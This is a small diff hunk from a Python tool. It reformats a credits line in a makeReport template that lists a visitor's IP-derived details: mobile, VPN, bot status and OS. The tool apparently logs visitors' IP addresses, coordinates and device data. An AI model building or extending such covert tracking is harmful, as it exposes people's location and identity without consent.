@@ -162,7 +162,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`  
-> **credits** `THIS TOOL IS MADE BY TG ACE` 
+> **credits**  THIS TOOL IS MADE BY TG ACE
 
 **PC Info:**
 > **OS:** `{os}`
